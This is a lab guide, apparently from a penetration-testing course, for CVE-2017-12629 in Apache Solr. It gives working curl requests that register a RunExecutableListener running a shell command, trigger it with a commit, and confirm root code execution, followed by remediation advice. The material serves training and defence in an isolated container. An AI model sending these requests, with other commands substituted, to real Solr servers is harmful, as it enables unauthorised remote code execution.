# Apache Solr RunExecutableListener Remote Code Execution (CVE-2017-12629)

## Laboratory Overview

This laboratory provides an isolated, production-grade practice target for studying **Apache Solr RunExecutableListener Remote Code Execution** (CVE-2017-12629).

- **Target Directory**: `Classes/02_web_penetration_tester/11_ssti_template_injection/solr_cve_2017_12629`
- **Default Port(s)**: `8198:8983` (`http://localhost:8198`)
- **CLI Shortcut**: `./lab start solr-runexec-rce`

---

## Architecture & Service Map

- **Container Name**: `cyberlab_02_solr_rce`
- **Upstream Image**: `vulhub/solr:7.0.1`
- **Pre-configured Core**: `demo`
- **Internal Port**: `8983` (mapped to host port `8198`)
- **Network Mode**: Bridge (Isolated Docker network)
- **Resource Ceiling**: 1024 MB RAM limit

---

## Vulnerability Mechanics

### Technical Root Cause

In Apache Solr versions prior to **7.1.0**, the Config API endpoint (`/solr/<core>/config`) is unauthenticated by default. This API allows users to manipulate Solr configurations dynamically via HTTP POST requests containing JSON directives.

One available component is `solr.RunExecutableListener`, designed to trigger arbitrary operating system binaries upon specific lifecycle events (such as `postCommit` or `newSearcher`). Attackers can register a malicious `RunExecutableListener` instance specifying an arbitrary system binary (`exe`), working directory (`dir`), and arguments (`args`). When a subsequent commit or search event is triggered, Solr executes the command on the host operating system with the privileges of the running Solr process (`root` inside the container).

---

## Step-by-Step Exploitation & Verification Workflow

### 1. Verify Service Availability

Confirm that Apache Solr is running and accessible:

```bash
curl -s -i http://localhost:8198/solr/admin/info/system
```

**Expected Response**:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=UTF-8

{
  "responseHeader": { "status": 0, "QTime": ... },
  "lucene": {
    "solr-spec-version": "7.0.1"
  },
  ...
}
```

### 2. Register the `RunExecutableListener`

Send a POST request to `/solr/demo/config` to add a new postCommit listener executing arbitrary commands:

```bash
curl -s -i -X POST http://localhost:8198/solr/demo/config \
  -H "Content-Type: application/json" \
  -d '{
    "add-listener": {
      "event": "postCommit",
      "name": "rce_listener",
      "class": "solr.RunExecutableListener",
      "exe": "sh",
      "dir": "/bin/",
      "args": ["-c", "touch /tmp/success && id > /tmp/whoami.txt"]
    }
  }'
```

**Expected Response**:

```json
{
  "responseHeader": {
    "status": 0,
    "QTime": 216
  },
  "WARNING": "This response format is experimental.  It is likely to change in the future."
}
```

### 3. Trigger the `postCommit` Hook

Trigger the registered listener by committing an update to the `demo` core:

```bash
curl -s -i -X POST "http://localhost:8198/solr/demo/update?commit=true" \
  -H "Content-Type: application/json" \
  -d '[{"id":"test"}]'
```

**Expected Response**:

```json
{
  "responseHeader": {
    "status": 0,
    "QTime": 52
  }
}
```

### 4. Verify Code Execution

Inspect the container filesystem to verify that the payload executed:

```bash
docker exec -it cyberlab_02_solr_rce ls -l /tmp
docker exec -it cyberlab_02_solr_rce cat /tmp/whoami.txt
```

**Expected Output**:

```text
-rw-r--r-- 1 root root  0 Oct 18 15:32 success
-rw-r--r-- 1 root root 39 Oct 18 15:32 whoami.txt
uid=0(root) gid=0(root) groups=0(root)
```

---

## Defensive Remediation & Hardening

1. **Upgrade Solr**: Upgrade Apache Solr to version **7.1.0** or higher where `RunExecutableListener` is removed or secured.
2. **Disable Config API Editing**: Launch Solr with the `-Ddisable.configEdit=true` system property to prevent runtime configuration changes via API.
3. **Authentication & Authorization**: Enable Solr's security framework using `BasicAuthPlugin` or `KerberosPlugin`, alongside `RuleBasedAuthorizationPlugin`, to restrict administrative access.
4. **Network Segmentation**: Isolate Solr instances within private networks and block untrusted external access to Solr ports (`8983`).

---

## Verified Video Walkthrough

- **Video Title**: [Apache Solr remote code execution](https://www.youtube.com/watch?v=dPEsjj3eONU)
- **Direct URL**: https://www.youtube.com/watch?v=dPEsjj3eONU

---

## Upstream References & Advisories

- **Official Vulhub Repository**: [Vulhub Solr CVE-2017-12629-RCE](https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-RCE)
- **Apache Lucene/Solr Security Advisory**: [CVE-2017-12629 Announcement](https://mail-archives.apache.org/mod_mbox/lucene-solr-user/201710.mbox/%3C051001d3439e$6ab8b310$402a1930$@apache.org%3E)
- **NVD CVE Entry**: [CVE-2017-12629 Detail](https://nvd.nist.gov/vuln/detail/CVE-2017-12629)
- **Exploit-DB Record**: [Exploit 43009](https://www.exploit-db.com/exploits/43009/)
